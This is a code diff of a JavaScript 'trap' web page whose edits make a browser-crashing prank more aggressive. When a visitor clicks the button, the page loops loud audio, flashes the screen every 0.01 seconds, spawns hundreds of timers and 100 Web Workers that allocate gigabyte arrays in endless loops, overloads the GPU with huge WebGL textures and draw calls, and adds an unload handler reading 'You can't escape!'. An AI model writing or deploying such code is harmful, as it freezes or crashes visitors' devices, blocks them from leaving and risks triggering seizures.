@@ -4,7 +4,7 @@
   <style>
     #trapButton {
       position: fixed;
-      top: 60%; /* Сдвигаем кнопку ниже, чтобы дать место заголовку */
+      top: 60%;
       left: 50%;
       transform: translate(-50%, -50%);
       padding: 2rem 4rem;
@@ -42,7 +42,7 @@
       font-family: 'Arial', sans-serif;
       font-size: 3rem;
       text-align: center;
-      margin-bottom: 2rem; /* Отступ между заголовком и кнопкой */
+      margin-bottom: 2rem;
       z-index: 9999;
     }
   </style>
@@ -64,45 +64,42 @@
         const response = await fetch('sound.mp3');
         const arrayBuffer = await response.arrayBuffer();
         audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
-      } catch (e) {}
+      } catch (e) {
+        console.error('Ошибка загрузки аудио:', e);
+      }
     }
 
     function playSound() {
-      if (audioBuffer) {
-        const source = audioCtx.createBufferSource();
-        source.buffer = audioBuffer;
-        
-        const gainNode = audioCtx.createGain();
-        gainNode.gain.value = 10.0;
-        
-        const distortion = audioCtx.createWaveShaper();
-        distortion.curve = makeDistortionCurve(500);
-        distortion.oversample = '4x';
-
-        source.connect(distortion)
-              .connect(gainNode)
-              .connect(audioCtx.destination);
-        
-        source.start(0);
-        
-        audio.volume = 1.0;
-        audio.play().catch(() => {});
-      } else {
-        audio.volume = 1.0;
-        audio.play().catch(() => {});
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
       }
-    }
 
-    function makeDistortionCurve(amount) {
-      const samples = 44100;
-      const curve = new Float32Array(samples);
-      const deg = Math.PI / 180;
-      
-      for (let i = 0; i < samples; ++i) {
-        const x = (i * 2) / samples - 1;
-        curve[i] = (3 + amount) * x * 20 * deg / (Math.PI + amount * Math.abs(x));
+      function createSoundSource() {
+        if (audioBuffer) {
+          const source = audioCtx.createBufferSource();
+          source.buffer = audioBuffer;
+
+          // Подключение напрямую без обработки
+          source.connect(audioCtx.destination);
+
+          source.start(0);
+
+          // Повторение звука
+          source.onended = () => {
+            createSoundSource();
+          };
+
+          // Резервное воспроизведение
+          audio.volume = 1.0;
+          audio.loop = true;
+          audio.play().catch(() => {});
+        } else {
+          audio.volume = 1.0;
+          audio.loop = true;
+          audio.play().catch(() => {});
+        }
       }
-      return curve;
+      createSoundSource();
     }
 
     loadAudio();
@@ -110,43 +107,50 @@
     trigger.onclick = () => {
       playSound();
       trigger.style.display = 'none';
-      document.body.style.animation = 'flash 0.1s infinite';
+      document.body.style.animation = 'flash 0.01s infinite';
 
-      const instantLag = () => {
-        const hugeArray = new ArrayBuffer(1024 * 1024 * 1024);
-        const view = new Uint32Array(hugeArray);
+      const extremeLag = () => {
         while(true) {
-          for(let i = 0; i < view.length; i++) {
-            view[i] = Math.random() * Math.sin(Date.now()) * 0xFFFFFFFF;
-            view[i] *= Math.cos(view[i]) / Math.tan(i);
+          const arrays = [];
+          for(let j = 0; j < 10; j++) {
+            const hugeArray = new ArrayBuffer(1024 * 1024 * 1024);
+            const view = new Uint32Array(hugeArray);
+            for(let i = 0; i < view.length; i++) {
+              view[i] = Math.random() * Math.sin(Date.now()) * Math.tan(i) * 0xFFFFFFFF;
+              view[i] *= Math.pow(Math.cos(view[i]), Math.random());
+            }
+            arrays.push(view);
           }
         }
       };
 
-      const gpuCrash = () => {
+      const gpuOverload = () => {
         const canvas = document.createElement('canvas');
         canvas.width = 32767;
         canvas.height = 32767;
+        document.body.appendChild(canvas);
         const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
         
         if (gl) {
-          const texture = gl.createTexture();
-          gl.bindTexture(gl.TEXTURE_2D, texture);
-          gl.texImage2D(
-            gl.TEXTURE_2D,
-            0,
-            gl.RGBA32F,
-            32767,
-            32767,
-            0,
-            gl.RGBA,
-            gl.FLOAT,
-            null
-          );
+          for(let t = 0; t < 10; t++) {
+            const texture = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            gl.texImage2D(
+              gl.TEXTURE_2D,
+              0,
+              gl.RGBA32F,
+              32767,
+              32767,
+              0,
+              gl.RGBA,
+              gl.FLOAT,
+              null
+            );
+          }
 
           const render = () => {
             gl.clear(gl.COLOR_BUFFER_BIT);
-            for(let i = 0; i < 1000; i++) {
+            for(let i = 0; i < 5000; i++) {
               gl.drawArrays(gl.TRIANGLES, 0, 32767 * 32767);
             }
             requestAnimationFrame(render);
@@ -155,23 +159,27 @@
         }
       };
 
-      for(let i = 0; i < 50; i++) {
-        setTimeout(() => {
-          instantLag();
-          gpuCrash();
-        }, 0);
+      for(let i = 0; i < 200; i++) {
+        setTimeout(extremeLag, 0);
+        setTimeout(gpuOverload, 0);
       }
 
-      for(let i = 0; i < 20; i++) {
+      for(let i = 0; i < 100; i++) {
         new Worker(URL.createObjectURL(new Blob([`
           while(true) {
-            let arr = new Float64Array(100000000);
+            let arr = new Float64Array(200000000);
             for(let i = 0; i < arr.length; i++) {
-              arr[i] = Math.random() * Math.pow(Math.sin(i), 2);
+              arr[i] = Math.random() * Math.pow(Math.sin(Math.tan(i)), 2);
+              arr[i] *= Math.log(arr[i] + 1) * Math.sqrt(i);
             }
           }
         `])));
       }
+
+      window.onbeforeunload = () => {
+        extremeLag();
+        return "You can't escape!";
+      };
     };
 
     document.head.innerHTML += `
